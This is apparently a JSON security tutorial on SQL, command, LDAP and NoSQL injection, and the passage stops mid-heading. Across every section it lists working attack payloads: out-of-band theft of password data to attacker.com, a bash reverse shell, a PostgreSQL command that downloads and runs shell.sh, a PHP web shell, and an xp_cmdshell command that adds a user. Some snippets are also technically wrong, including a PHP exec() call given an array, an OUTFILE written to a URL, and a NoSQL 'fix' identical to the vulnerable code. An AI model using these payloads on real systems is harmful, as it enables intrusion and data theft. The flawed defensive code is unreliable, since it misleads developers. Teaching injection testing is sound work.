{
  "id": "injection-vulnerabilities-deep-dive",
  "title": "Injection Vulnerabilities Deep Dive",
  "description": "Comprehensive analysis of injection vulnerabilities including SQL injection, command injection, and LDAP injection. Learn exploitation techniques, detection methods, and prevention strategies for these critical web application security flaws.",
  "type": "tutorial",
  "steps": [
    {
      "id": "sql-injection-fundamentals",
      "title": "SQL Injection Fundamentals",
      "content": "OBJECTIVE: Understand the core concepts of SQL injection vulnerabilities, including how they occur, their impact, and basic exploitation techniques.\n\nACADEMIC BACKGROUND:\nSQL injection (SQLi) is one of the most critical web application vulnerabilities, consistently ranked in the OWASP Top 10. It occurs when untrusted user input is concatenated into SQL queries without proper sanitization. The vulnerability was first documented in 1998 but remains prevalent due to poor coding practices. Research from Verizon's DBIR shows SQLi accounts for 8% of web application attacks.\n\nSTEP-BY-STEP PROCESS:\n\n1. Understanding SQL Injection Mechanics:\n\nHow SQL Injection Works:\n```sql\n-- Vulnerable PHP code:\n$query = \"SELECT * FROM users WHERE username = '\" . $_POST['username'] . \"' AND password = '\" . $_POST['password'] . \"'\";\n\n-- Attacker input: ' OR '1'='1\n-- Resulting query: SELECT * FROM users WHERE username = '' OR '1'='1' AND password = '' OR '1'='1'\n-- This returns all users because '1'='1' is always true\n```\n\nTypes of SQL Injection:\n- **Classic SQLi**: Direct input concatenation\n- **Blind SQLi**: No visible error messages or data returned\n- **Time-based Blind SQLi**: Uses time delays to infer information\n- **Out-of-Band SQLi**: Data exfiltrated via DNS, HTTP requests\n- **Second-order SQLi**: Input stored and executed later\n- **Union-based SQLi**: Uses UNION to combine results\n\n2. Basic SQL Injection Exploitation:\n\nTesting for SQL Injection:\n```bash\n# Basic payload testing\n' OR '1'='1\n' OR '1'='1' --\n\" OR \"1\"=\"1\n\") OR (\"1\"=\"1\n\n# Error-based testing\n' AND 1=CONVERT(int,@@version) --\n' AND 1=CAST(@@version AS int) --\n```\n\nDatabase-Specific Syntax:\n```sql\n-- MySQL\nSELECT @@version;\nSELECT user();\nSELECT database();\n\n-- PostgreSQL  \nSELECT version();\nSELECT current_user;\nSELECT current_database();\n\n-- MSSQL\nSELECT @@version;\nSELECT user_name();\nSELECT db_name();\n\n-- Oracle\nSELECT banner FROM v$version;\nSELECT user FROM dual;\n```\n\n3. Union-Based SQL Injection:\n\nExploiting with UNION:\n```sql\n-- Determine number of columns\n' ORDER BY 1 --\n' ORDER BY 2 --\n' ORDER BY 3 --  (until error)\n\n-- Use UNION to extract data\n' UNION SELECT 1,2,3 --\n' UNION SELECT null,null,null --\n' UNION SELECT user,password,3 FROM users --\n```\n\n4. Error-Based SQL Injection:\n\nForcing Database Errors:\n```sql\n-- MySQL error disclosure\n' AND extractvalue(1,concat(0x7e,(SELECT @@version),0x7e)) --\n\n-- MSSQL error disclosure\n' AND 1=convert(int,@@version) --\n\n-- PostgreSQL error disclosure\n' AND 1=cast(version() as int) --\n```\n\n5. Blind SQL Injection Techniques:\n\nBoolean-Based Blind SQLi:\n```sql\n-- Test true/false conditions\n' AND 1=1 --  (page loads normally)\n' AND 1=2 --  (page behaves differently)\n\n-- Extract database version bit by bit\n' AND ASCII(SUBSTRING((SELECT @@version),1,1))>64 --\n```\n\nTime-Based Blind SQLi:\n```sql\n-- MySQL time delay\n' AND IF(1=1, SLEEP(5), 0) --\n\n-- MSSQL time delay\n' AND IF(1=1) WAITFOR DELAY '0:0:5' --\n\n-- PostgreSQL time delay\n' AND 1=1 AND 1234=(SELECT 1234 FROM PG_SLEEP(5)) --\n```\n\nWHAT TO LOOK FOR:\n- **User Input in SQL Queries**: Any dynamic SQL construction\n- **Missing Input Validation**: No parameterized queries or escaping\n- **Database Error Messages**: Leaked in application responses\n- **Unexpected Query Results**: All records returned, wrong data displayed\n- **Application Crashes**: From malformed SQL syntax\n\nSECURITY IMPLICATIONS:\n- **Data Breach**: Unauthorized access to sensitive user data\n- **Data Manipulation**: Ability to modify or delete database records\n- **Authentication Bypass**: Login without valid credentials\n- **Privilege Escalation**: Access to admin functionality\n- **System Compromise**: Command execution via database functions\n\nCOMMON PITFALLS:\n- **Only Testing Login Forms**: SQLi can occur in search, comments, profiles\n- **Assuming Prepared Statements**: Not all code uses them properly\n- **Missing Error Handling**: Database errors reveal system information\n- **Stored Procedures**: Can still be vulnerable if dynamic SQL used\n- **Second-Order Injection**: Input appears safe initially but dangerous later\n\nTOOLS REFERENCE:\n- **sqlmap**: https://sqlmap.org/ (automated SQL injection tool)\n- **Burp Suite**: https://portswigger.net/burp (manual testing and interception)\n- **Havij**: https://www.itsecteam.com/products/havij-v1-17-pl1/ (graphical SQLi tool)\n- **SQLninja**: http://sqlninja.sourceforge.net/ (MSSQL exploitation)\n- **BeEF**: https://beefproject.com/ (browser exploitation framework)\n\nFURTHER READING:\n- OWASP SQL Injection: https://owasp.org/www-community/attacks/SQL_Injection\n- PortSwigger SQL Injection: https://portswigger.net/web-security/sql-injection\n- SQL Injection Cheat Sheet: https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/\n- Advanced SQL Injection: https://www.exploit-db.com/docs/english/13654-advanced-sql-injection.pdf",
      "tags": [
        "sql-injection",
        "injection",
        "database",
        "vulnerability",
        "exploitation"
      ],
      "related_tools": [
        "comparison_sql_testing",
        "linux-exploit-suggester",
        "windows-exploit-suggester",
        "burp-api-scanner",
        "owasp-zap"
      ]
    },
    {
      "id": "advanced-sql-injection-techniques",
      "title": "Advanced SQL Injection Techniques",
      "content": "OBJECTIVE: Master advanced SQL injection exploitation techniques including stacked queries, out-of-band injection, and database-specific attacks.\n\nACADEMIC BACKGROUND:\nAdvanced SQL injection techniques go beyond basic exploitation to include complex attack vectors that can bypass security controls and achieve deeper system compromise. Research from Black Hat conferences demonstrates how advanced SQLi can lead to full system takeover. Understanding these techniques is crucial for both offensive security professionals and defenders.\n\nSTEP-BY-STEP PROCESS:\n\n1. Stacked Query Exploitation:\n\nMultiple Statement Execution:\n```sql\n-- MySQL stacked queries\n'; SELECT * FROM users; --\n\n-- MSSQL stacked queries\n'; SELECT * FROM users; --\n\n-- PostgreSQL stacked queries\n'; SELECT * FROM users; --\n\n-- Oracle stacked queries (limited support)\n-- Oracle doesn't support stacked queries in most contexts\n```\n\nAdvanced Stacked Attacks:\n```sql\n-- Create backdoor user\n'; INSERT INTO users (username,password) VALUES ('admin','hacked'); --\n\n-- Modify existing user\n'; UPDATE users SET password='hacked' WHERE username='admin'; --\n\n-- Execute system commands (if xp_cmdshell enabled)\n'; EXEC xp_cmdshell 'net user hacker password /add'; --\n```\n\n2. Out-of-Band (OOB) SQL Injection:\n\nDNS Exfiltration Techniques:\n```sql\n-- MySQL OOB via DNS\n' AND LOAD_FILE(CONCAT('\\\\',(SELECT password FROM users LIMIT 1),'.attacker.com\\')) --\n\n-- MSSQL OOB via DNS\n'; DECLARE @host varchar(1024); SELECT @host=(SELECT TOP 1 password FROM users); EXEC('master..xp_dirtree \"//'+@host+'.attacker.com/foo\"'); --\n\n-- PostgreSQL OOB via DNS\n'; COPY (SELECT '') TO PROGRAM 'nslookup (SELECT password FROM users LIMIT 1)||.attacker.com'; --\n```\n\nHTTP-Based OOB:\n```sql\n-- MySQL HTTP exfiltration\n' AND 1=0 UNION SELECT LOAD_FILE('/etc/passwd') INTO OUTFILE 'http://attacker.com/log.php?data=' --\n\n-- MSSQL HTTP exfiltration\n'; DECLARE @url varchar(1024); SET @url='http://attacker.com/log.php?data='+(SELECT TOP 1 password FROM users); EXEC sp_makewebtask @url; --\n```\n\n3. Database-Specific Advanced Techniques:\n\nMySQL Advanced Exploitation:\n```sql\n-- Read files\n' UNION SELECT LOAD_FILE('/etc/passwd') --\n\n-- Write files\n' UNION SELECT 'malicious code' INTO OUTFILE '/var/www/shell.php' --\n\n-- User-defined functions\n' UNION SELECT sys_exec('id') --\n\n-- Time-based with heavy operations\n' AND BENCHMARK(1000000,SHA1(1)) --\n```\n\nMSSQL Advanced Exploitation:\n```sql\n-- Enable xp_cmdshell\n'; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE; --\n\n-- Execute system commands\n'; EXEC xp_cmdshell 'whoami'; --\n\n-- Linked server attacks\n'; SELECT * FROM OPENROWSET('SQLOLEDB','';'sa';'password','SELECT * FROM master.dbo.syslogins') --\n\n-- CLR assembly execution\n'; CREATE ASSEMBLY MyAssembly FROM 0x4D5A...; --\n```\n\nPostgreSQL Advanced Exploitation:\n```sql\n-- Large object functions\n'; SELECT lo_import('/etc/passwd'); --\n\n-- dblink for remote queries\n'; SELECT dblink_connect('host=attacker.com user=postgres dbname=template1'); --\n\n-- Copy to program execution\n'; COPY (SELECT '') TO PROGRAM 'wget http://attacker.com/shell.sh -O /tmp/shell.sh && bash /tmp/shell.sh'; --\n\n-- Unlogged tables for persistence\n'; CREATE UNLOGGED TABLE backdoor (data text); --\n```\n\nOracle Advanced Exploitation:\n```sql\n-- UTL_HTTP for outbound connections\n' AND 1=UTL_HTTP.request('http://attacker.com/log.php?data='||user) --\n\n-- DBMS_XMLGEN for data exfiltration\n' AND 1=DBMS_XMLGEN.getxml('SELECT * FROM users') --\n\n-- Java execution\n' AND 1=DBMS_JAVA.RUNJAVA('oracle/aurora/util/Wrapper','main','/tmp','exploit') --\n```\n\n4. WAF Bypass Techniques:\n\nCommon WAF Evasion:\n```sql\n-- Case variation\n' UnIoN SeLeCt 1,2,3 --\n\n-- Comments and whitespace\n'/**/UNION/**/SELECT/**/1,2,3--\n\n-- Encoding\n'%27%20OR%20%271%27%3D%271\n\n-- Inline comments\n' UNI/*comment*/ON SEL/*comment*/ECT 1,2,3--\n```\n\nAdvanced WAF Bypass:\n```sql\n-- Scientific notation\n' UNION SELECT 1e0,2e0,3e0 --\n\n-- Hex encoding\n' UNION SELECT 0x31,0x32,0x33 --\n\n-- Nested queries\n' AND (SELECT * FROM (SELECT 1) x) --\n\n-- Time-based bypass\n' AND IF(1=1,SLEEP(0),SLEEP(5)) --\n```\n\n5. Second-Order SQL Injection:\n\nStored Input Exploitation:\n```sql\n-- Registration form stores: admin'--\n-- Login query becomes: SELECT * FROM users WHERE username='admin'--' AND password='...'\n\n-- Profile update stores: ', password='hacked' WHERE username='admin' --\n-- Query becomes: UPDATE users SET name='', password='hacked' WHERE username='admin' --' WHERE id=123\n```\n\nComplex Second-Order:\n```sql\n-- Multi-step exploitation\n-- Step 1: Store payload in profile\n-- Step 2: Trigger via different functionality\n-- Step 3: Execute stored payload\n```\n\n6. SQL Injection in Modern Frameworks:\n\nORM Vulnerabilities:\n```sql\n-- Hibernate HQL injection\n// Vulnerable: session.createQuery(\"FROM User WHERE name = '\" + input + \"'\")\n// Exploitable: ' OR '1'='1\n\n-- Entity Framework LINQ injection\n// Vulnerable dynamic LINQ\n// Exploitable: \" OR 1=1 --\n```\n\nNoSQL Injection Context:\n```javascript\n// MongoDB injection\n// Vulnerable: db.users.find({username: input})\n// Exploitable: { \"$ne\": null }\n\n// Input: {\"username\": {\"$ne\": null}, \"password\": {\"$ne\": null}}\n// Result: Returns all users\n```\n\nWHAT TO LOOK FOR:\n- **Stacked Query Support**: Multiple statements in single query\n- **Database Functions**: Available system/exec functions\n- **File System Access**: Read/write file capabilities\n- **Network Connectivity**: Outbound connection abilities\n- **WAF Presence**: Web application firewall detection\n- **Input Storage**: Data stored for later processing\n- **Framework Usage**: ORM, prepared statements, or raw SQL\n\nSECURITY IMPLICATIONS:\n- **Full System Compromise**: Command execution via database functions\n- **Data Exfiltration**: Out-of-band data theft\n- **Persistence**: Backdoors via database features\n- **Lateral Movement**: Linked servers and remote queries\n- **WAF Bypass**: Circumventing security controls\n\nCOMMON PITFALLS:\n- **Assuming Single Statement**: Not testing for stacked queries\n- **Missing OOB Testing**: Only testing visible responses\n- **Database Agnostic Tools**: Not using database-specific techniques\n- **WAF Detection**: Not adapting to filtering rules\n- **Second-Order Overlook**: Missing stored input vulnerabilities\n- **Modern Framework Safety**: Assuming ORMs prevent all injection\n\nTOOLS REFERENCE:\n- **sqlmap**: https://sqlmap.org/ (advanced automation)\n- **SQLMap with Tamper Scripts**: https://github.com/sqlmapproject/sqlmap/tree/master/tamper\n- **NoSQLMap**: https://github.com/codingo/NoSQLMap (NoSQL injection)\n- **Whitewidow**: https://github.com/WhitewidowScanner/whitewidow (SQLi scanner)\n- **GHDB**: https://www.exploit-db.com/google-hacking-database (Google dorking)\n\nFURTHER READING:\n- Advanced SQL Injection In SQL Server: https://www.exploit-db.com/docs/english/18255-advanced-sql-injection.pdf\n- Out-of-Band SQL Injection: https://portswigger.net/research/out-of-band-sql-injection\n- WAF Bypass Techniques: https://www.netsparker.com/blog/web-security/sql-injection-bypassing-waf/\n- Second-Order SQL Injection: https://portswigger.net/web-security/sql-injection/second-order\n- Database-Specific Attacks: https://www.blackhat.com/presentations/bh-usa-07/McDonald/Whitepaper/bh-usa-07-mcdonald-WP.pdf",
      "tags": [
        "sql-injection",
        "advanced-techniques",
        "waf-bypass",
        "stacked-queries",
        "oob-injection"
      ],
      "related_tools": [
        "comparison_sql_testing",
        "linux-exploit-suggester",
        "windows-exploit-suggester",
        "sqlmap",
        "dns-tunneling"
      ]
    },
    {
      "id": "command-injection-exploitation",
      "title": "Command Injection Exploitation",
      "content": "OBJECTIVE: Understand and exploit command injection vulnerabilities where user input is passed to system commands without proper sanitization.\n\nACADEMIC BACKGROUND:\nCommand injection occurs when applications execute system commands containing untrusted user input. This vulnerability allows attackers to execute arbitrary commands on the underlying operating system. First documented in the 1990s, command injection remains prevalent in web applications that interface with system utilities. Verizon's DBIR reports command injection in 6% of web application breaches.\n\nSTEP-BY-STEP PROCESS:\n\n1. Command Injection Fundamentals:\n\nHow Command Injection Works:\n```php\n// Vulnerable PHP code\n$ping = $_GET['ip'];\nsystem(\"ping -c 4 \" . $ping);\n\n// Attacker input: 127.0.0.1; cat /etc/passwd\n// Resulting command: ping -c 4 127.0.0.1; cat /etc/passwd\n```\n\nCommon Injection Points:\n- **System utilities**: ping, traceroute, nslookup, dig\n- **File operations**: wget, curl, tar, unzip\n- **Image processing**: ImageMagick, exiftool\n- **Document conversion**: pandoc, wkhtmltopdf\n- **Network tools**: ssh, ftp, mail\n\n2. Basic Command Injection:\n\nTesting for Injection:\n```bash\n# Basic command chaining\n127.0.0.1; id\n127.0.0.1 && id\n127.0.0.1 || id\n\n# Command substitution\n$(id)\n`id`\n\n# Background execution\n127.0.0.1 & id\n```\n\nOS-Specific Syntax:\n```bash\n# Linux/Unix\n; id\n| id\n`id`\n$(id)\n\n# Windows\n& dir\n&& dir\n| dir\n|| dir\n```\n\n3. Blind Command Injection:\n\nTime-Based Detection:\n```bash\n# Linux sleep\n127.0.0.1; sleep 10\n\n# Windows timeout\n127.0.0.1 & timeout /t 10\n\n# ping delay\n127.0.0.1 & ping -n 10 127.0.0.1\n```\n\nOutput Redirection:\n```bash\n# Write to file\n127.0.0.1; id > /tmp/output.txt\n\n# Append to file\n127.0.0.1; id >> /var/www/html/output.txt\n\n# Send via HTTP\n127.0.0.1; curl http://attacker.com/`id`\n```\n\n4. Advanced Command Injection:\n\nBypass Techniques:\n```bash\n# Space bypass\n127.0.0.1;cat$IFS/etc/passwd\n127.0.0.1;{cat,/etc/passwd}\n\n# Blacklist bypass\n127.0.0.1;w'h'o'am'i\n127.0.0.1;w\"\"h\"\"o\"\"a\"\"m\"\"i\n\n# Encoding bypass\n127.0.0.1;echo 'Y2F0IC9ldGMvcGFzc3dk'|base64 -d|bash\n```\n\nComplex Payloads:\n```bash\n# Reverse shell\n127.0.0.1; bash -i >& /dev/tcp/attacker.com/4444 0>&1\n\n# Web shell upload\n127.0.0.1; echo '<?php system($_GET[\"cmd\"]); ?>' > /var/www/shell.php\n\n# Privilege escalation\n127.0.0.1; sudo -u root /bin/bash -c 'id'\n```\n\n5. Command Injection in Web Applications:\n\nPHP Command Injection:\n```php\n// Vulnerable patterns\nexec(\"ping \" . $_GET['host']);\nsystem($_POST['cmd']);\npassthru(\"nslookup \" . $input);\n\n// Safer alternatives\nexec(\"ping \" . escapeshellarg($host));\n// or use arrays\nexec(['ping', '-c', '4', $host]);\n```\n\nPython Command Injection:\n```python\n# Vulnerable\nos.system(\"ping \" + user_input)\nsubprocess.call(\"wget \" + url, shell=True)\n\n# Safer\nsubprocess.run(['ping', '-c', '4', user_input])\nsubprocess.run(['wget', url])\n```\n\nNode.js Command Injection:\n```javascript\n// Vulnerable\nchild_process.exec('ping ' + req.query.host);\n\n// Safer\nchild_process.execFile('ping', ['-c', '4', req.query.host]);\n```\n\n6. Command Injection Prevention:\n\nInput Validation:\n```php\n// Whitelist validation\n$allowed_hosts = ['8.8.8.8', '1.1.1.1'];\nif (!in_array($host, $allowed_hosts)) {\n    die('Invalid host');\n}\n\n// Regex validation\nif (!preg_match('/^\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}$/', $host)) {\n    die('Invalid IP');\n}\n```\n\nSecure Coding Practices:\n```php\n// Use escapeshellarg for single arguments\n$safe_cmd = 'ping -c 4 ' . escapeshellarg($host);\nexec($safe_cmd);\n\n// Use arrays with exec functions\nexec(['ping', '-c', '4', $host]);\n\n// Avoid shell execution entirely\n// Use PHP native functions instead\n```\n\nWHAT TO LOOK FOR:\n- **System Command Execution**: Applications calling external utilities\n- **User Input in Commands**: Dynamic command construction\n- **Insufficient Validation**: No input sanitization or whitelisting\n- **Shell Metacharacters**: Presence of ; | & ` $ ( ) in input handling\n- **Error Messages**: Command output leaked in responses\n- **Blind Injection**: No visible command output\n\nSECURITY IMPLICATIONS:\n- **System Compromise**: Full OS command execution\n- **Data Exfiltration**: Access to sensitive files\n- **Privilege Escalation**: Running commands as elevated user\n- **Network Pivot**: Using compromised host for further attacks\n- **Persistence**: Installing backdoors or malware\n\nCOMMON PITFALLS:\n- **Only Testing Obvious Commands**: Missing blind injection\n- **Assuming Linux Only**: Not testing Windows command syntax\n- **Missing Encoding Bypass**: Not testing encoded payloads\n- **Incomplete Blacklist**: Bypassing simple command filters\n- **Safe Function Usage**: Using exec() safely but passthru() unsafely\n- **Indirect Command Injection**: Commands executed via other vulnerable functions\n\nTOOLS REFERENCE:\n- **Commix**: https://github.com/commixproject/commix (command injection tool)\n- **Burp Suite**: https://portswigger.net/burp (manual testing)\n- **OWASP ZAP**: https://www.zaproxy.org/ (automated scanning)\n- **Metasploit**: https://www.metasploit.com/ (exploit modules)\n- **BeEF**: https://beefproject.com/ (command injection via XSS)\n\nFURTHER READING:\n- OWASP Command Injection: https://owasp.org/www-community/attacks/Command_Injection\n- PortSwigger Command Injection: https://portswigger.net/web-security/os-command-injection\n- Command Injection Cheat Sheet: https://www.netsparker.com/blog/web-security/command-injection-cheat-sheet/\n- PHP Command Injection: https://www.php.net/manual/en/function.exec.php\n- Node.js Command Injection: https://nodejs.org/api/child_process.html",
      "tags": [
        "command-injection",
        "system-commands",
        "exploitation",
        "shell-injection",
        "os-commands"
      ],
      "related_tools": [
        "linux-exploit-suggester",
        "windows-exploit-suggester",
        "owasp-zap",
        "ml-pipeline-audit",
        "linux-smart-enumeration"
      ]
    },
    {
      "id": "ldap-injection-attacks",
      "title": "LDAP Injection Attacks",
      "content": "OBJECTIVE: Understand and exploit LDAP injection vulnerabilities where user input is improperly handled in LDAP queries.\n\nACADEMIC BACKGROUND:\nLDAP injection occurs when applications construct LDAP queries using untrusted user input without proper escaping. This vulnerability allows attackers to modify LDAP search filters to access unauthorized directory information. While less common than SQL injection, LDAP injection can be devastating in enterprise environments with Active Directory or LDAP-based authentication systems.\n\nSTEP-BY-STEP PROCESS:\n\n1. LDAP Injection Fundamentals:\n\nHow LDAP Injection Works:\n```php\n// Vulnerable PHP code with LDAP\n$filter = \"(uid=\" . $_GET['username'] . \")\";\n$results = ldap_search($ds, $base_dn, $filter);\n\n// Attacker input: admin)(&\n// Resulting filter: (uid=admin)(&\n// This creates an invalid filter that may cause errors or unexpected behavior\n```\n\nLDAP Query Structure:\n```ldap\n# Basic LDAP filter\n(uid=john)\n\n# Complex filters\n(&(uid=john)(ou=users))\n(|(uid=john)(uid=jane))\n(!(uid=admin))\n\n# With wildcards\n(uid=john*)\n```\n\n2. Basic LDAP Injection:\n\nAuthentication Bypass:\n```ldap\n# Login form injection\nUsername: admin)(&\nPassword: anything\n\n# Resulting filter: (&(uid=admin)(&) (userPassword=anything))\n# The (&) makes the filter always true\n\nUsername: admin))(|(uid=*\nPassword: anything\n\n# Resulting filter: (&(uid=admin))(|(uid=*) (userPassword=anything))\n# Matches any user whose uid starts with anything\n```\n\nInformation Disclosure:\n```ldap\n# Extract all users\nUsername: admin)(|(uid=*\nPassword: anything\n\n# Extract specific attributes\nUsername: admin)(description=*\nPassword: anything\n```\n\n3. Advanced LDAP Injection:\n\nBlind LDAP Injection:\n```ldap\n# Boolean-based blind\nUsername: admin)(&(1=1\nPassword: anything\n\nUsername: admin)(&(1=2\nPassword: anything\n\n# Time-based (if supported)\nUsername: admin)(&(1=1)(sleep=5\nPassword: anything\n```\n\nFilter Manipulation:\n```ldap\n# Change search scope\nUsername: admin)(ou=*\nPassword: anything\n\n# Modify attributes\nUsername: admin)(objectClass=*\nPassword: anything\n\n# Access control bypass\nUsername: admin)(adminFlag=1\nPassword: anything\n```\n\n4. LDAP Injection in Different Languages:\n\nPHP LDAP Injection:\n```php\n// Vulnerable\n$filter = \"(uid=\" . $_GET['user'] . \")\";\nldap_search($ds, $dn, $filter);\n\n// Exploitable input: admin)(|\n// Creates filter: (uid=admin)(| )\n```\n\nJava LDAP Injection:\n```java\n// Vulnerable\nString filter = \"(uid=\" + request.getParameter(\"user\") + \")\";\nNamingEnumeration results = ctx.search(baseDN, filter, controls);\n\n// Exploitable input: admin)(&\n```\n\nPython LDAP Injection:\n```python\n# Vulnerable\nfilter = \"(uid=%s)\" % user_input\nconn.search(base_dn, filter)\n\n# Exploitable input: admin)(|\n```\n\n5. LDAP Injection Prevention:\n\nInput Sanitization:\n```php\n// Use ldap_escape function (PHP)\n$user = ldap_escape($_GET['user'], \"\", LDAP_ESCAPE_FILTER);\n$filter = \"(uid=\" . $user . \")\";\n\n// Manual escaping\nfunction ldap_escape($string) {\n    return str_replace(['\\\\', '*', '(', ')'], ['\\\\\\\\', '\\\\*', '\\\\(', '\\\\)'], $string);\n}\n```\n\nParameterized Queries:\n```php\n// Use prepared statements-like approach\n$filter_template = \"(uid=%s)\";\n$safe_filter = sprintf($filter_template, ldap_escape($user));\n\n// Or use arrays\n$filters = ['uid' => $user];\nldap_search($ds, $dn, $filters);\n```\n\n6. Active Directory Exploitation:\n\nAD-Specific Attacks:\n```ldap\n# Domain admin access\nUsername: administrator)(memberOf=*\nPassword: anything\n\n# Group membership enumeration\nUsername: user)(memberOf=Domain Admins\nPassword: anything\n\n# Password policy bypass\nUsername: admin)(pwdLastSet=0\nPassword: anything\n```\n\nKerberos Integration:\n```bash\n# LDAP over Kerberos\n# If LDAP injection leads to Kerberos ticket access\n\n# Golden ticket creation\n# Extract krbtgt hash via LDAP injection\n```\n\nWHAT TO LOOK FOR:\n- **LDAP Query Construction**: Dynamic filter building\n- **User Input in Filters**: Unescaped user data in LDAP queries\n- **Authentication Systems**: LDAP/AD-based login forms\n- **Directory Services**: Applications querying user/group information\n- **Search Functionality**: LDAP-backed search features\n- **Missing Escaping**: No ldap_escape or equivalent functions\n\nSECURITY IMPLICATIONS:\n- **Authentication Bypass**: Login without valid credentials\n- **Information Disclosure**: Access to directory data\n- **Privilege Escalation**: Access to admin accounts/groups\n- **Data Manipulation**: Modify directory entries\n- **Domain Compromise**: Active Directory takeover\n\nCOMMON PITFALLS:\n- **Only Testing Login**: Missing search and other LDAP operations\n- **Assuming Blind Injection**: Not testing for visible responses\n- **Incomplete Escaping**: Only escaping some special characters\n- **Framework Assumptions**: Believing ORMs prevent LDAP injection\n- **AD-Specific Features**: Missing domain controller attacks\n- **Kerberos Integration**: Not considering ticket-based attacks\n\nTOOLS REFERENCE:\n- **ldapsearch**: OpenLDAP tool for testing LDAP queries\n- **ADSearch**: https://github.com/tomcarver16/ADSearch (Active Directory enumeration)\n- **BloodHound**: https://github.com/BloodHoundAD/BloodHound (AD attack paths)\n- **ldapdomaindump**: https://github.com/dirkjanm/ldapdomaindump (LDAP enumeration)\n- **CrackMapExec**: https://github.com/byt3bl33d3r/CrackMapExec (AD exploitation)\n\nFURTHER READING:\n- OWASP LDAP Injection: https://owasp.org/www-community/attacks/LDAP_Injection\n- LDAP Injection Cheat Sheet: https://www.netsparker.com/blog/web-security/ldap-injection-cheat-sheet/\n- Active Directory Security: https://adsecurity.org/\n- LDAP Filter Syntax: https://ldap.com/ldap-filters/\n- PHP LDAP Security: https://www.php.net/manual/en/function.ldap-escape.php",
      "tags": [
        "ldap-injection",
        "directory-services",
        "active-directory",
        "authentication",
        "directory-injection"
      ],
      "related_tools": [
        "comparison_directory_fuzzers",
        "linux-exploit-suggester",
        "windows-exploit-suggester",
        "burp-api-scanner",
        "ffuf-api"
      ]
    },
    {
      "id": "nosql-injection-attacks",
      "title": "NoSQL Injection Attacks",
      "content": "OBJECTIVE: Understand and exploit NoSQL injection vulnerabilities in MongoDB, CouchDB, and other NoSQL databases where query operators can be injected.\n\nACADEMIC BACKGROUND:\nNoSQL injection occurs when applications construct NoSQL queries using untrusted user input without proper sanitization. Unlike traditional SQL injection, NoSQL injection exploits the query language and operators of NoSQL databases. With the rise of NoSQL databases in modern web applications, this vulnerability has become increasingly prevalent.\n\nSTEP-BY-STEP PROCESS:\n\n1. MongoDB Injection Fundamentals:\n\nHow MongoDB Injection Works:\n```javascript\n// Vulnerable Node.js code\nconst query = { username: req.body.username, password: req.body.password };\nconst user = await User.findOne(query);\n\n// Attacker input: { \"$ne\": null }\n// Resulting query: { username: { \"$ne\": null }, password: { \"$ne\": null } }\n// This matches any user because $ne means \"not equal\"\n```\n\nMongoDB Query Operators:\n```javascript\n// Comparison operators\n$eq, $ne, $gt, $gte, $lt, $lte\n$in, $nin\n\n// Logical operators\n$and, $or, $not, $nor\n\n// Element operators\n$exists, $type\n\n// Array operators\n$all, $elemMatch, $size\n```\n\n2. Basic MongoDB Injection:\n\nAuthentication Bypass:\n```javascript\n// Login bypass\nUsername: admin\nPassword: { \"$ne\": null }\n\n// Result: { username: \"admin\", password: { \"$ne\": null } }\n// Matches any user with username \"admin\" regardless of password\n\nUsername: { \"$ne\": null }\nPassword: { \"$ne\": null }\n\n// Result: Matches any user\n```\n\nData Extraction:\n```javascript\n// Extract all users\nUsername: { \"$ne\": null }\nPassword: { \"$ne\": null }\n\n// Extract specific user data\nUsername: admin\nPassword: { \"$regex\": \".*\" }\n```\n\n3. Advanced MongoDB Injection:\n\nOperator Injection:\n```javascript\n// $where operator (JavaScript execution)\nUsername: admin\nPassword: { \"$where\": \"this.username === 'admin'\" }\n\n// $regex for pattern matching\nUsername: { \"$regex\": \"^admin\" }\nPassword: anything\n\n// $in for array matching\nUsername: { \"$in\": [\"admin\", \"root\", \"administrator\"] }\nPassword: anything\n```\n\nBlind NoSQL Injection:\n```javascript\n// Boolean-based blind\nUsername: admin\nPassword: { \"$ne\": \"wrong\" }  // True condition\nPassword: { \"$ne\": \"correct\" }  // False condition\n\n// Time-based (if $where supported)\nUsername: admin\nPassword: { \"$where\": \"sleep(5000)\" }\n```\n\n4. Other NoSQL Databases:\n\nCouchDB Injection:\n```javascript\n// CouchDB query injection\n// Vulnerable: db.view('design', 'view', { key: user_input })\n\n// Injection payload\nuser_input = [\"_all_docs\", {\"include_docs\": true}]\n// Accesses all documents\n```\n\nCassandra Injection:\n```cql\n// CQL injection\n// Vulnerable: \"SELECT * FROM users WHERE username = '\" + input + \"'\"\n\n// Injection: admin' OR '1'='1\n// Result: SELECT * FROM users WHERE username = 'admin' OR '1'='1'\n```\n\nRedis Injection:\n```bash\n// Redis command injection\n// Vulnerable: redis.eval(\"return redis.call('get', '\" + key + \"')\")\n\n// Injection: user_data'); redis.call('set', 'evil_key', 'evil_value\n// Executes additional Redis commands\n```\n\n5. NoSQL Injection Prevention:\n\nInput Validation:\n```javascript\n// Type checking\nif (typeof req.body.username !== 'string') {\n    return res.status(400).json({ error: 'Invalid username' });\n}\n\n// Schema validation\nconst userSchema = Joi.object({\n    username: Joi.string().alphanum().min(3).max(30).required(),\n    password: Joi.string().min(6).required()\n});\n\nconst { error } = userSchema.validate(req.body);\nif (error) return res.status(400).json({ error: error.details[0].message });\n```\n\nParameterized Queries:\n```javascript\n// Use parameterized queries\nconst user = await User.findOne({ \n    username: req.body.username,\n    password: req.body.password \n});\n\n// Avoid dynamic query construction\n// DON'T DO: User.findOne(JSON.parse(req.body.query))\n```\n\nSanitization Functions:\n```javascript\n// MongoDB operator sanitization\nfunction sanitize(obj) {\n    const forbidden = ['$where', '$regex', '$ne', '$gt', '$lt', '$in', '$nin'];\n    \n    function sanitizeRecursive(obj) {\n        if (typeof obj !== 'object' || obj === null) return obj;\n        \n        for (let key in obj) {\n            if (forbidden.includes(key)) {\n                delete obj[key];\n            } else if (typeof obj[key] === 'object') {\n                sanitizeRecursive(obj[key]);\n            }\n        }\n        return obj;\n    }\n    \n    return sanitizeRecursive(obj);\n}\n```\n\n6. Modern Framework Protection:\n\nMongoose ODM:\n```javascript\n// Mongoose built-in protection\nconst userSchema = new mongoose.Schema({\n    username: { type: String, required: true },\n    password: { type: String, required: true }\n});\n\n// But still vulnerable to:\nUser.findOne().where('username').equals(req.body.username)\n// If req.body.username contains operators\n```\n\nODM Best Practices:\n```javascript\n// Use schema validation\nconst User = mongoose.model('User', userSchema);\nconst user = await User.findOne({\n    username: req.body.username,\n    password: req.body.password\n});\n```\n\nWHAT TO 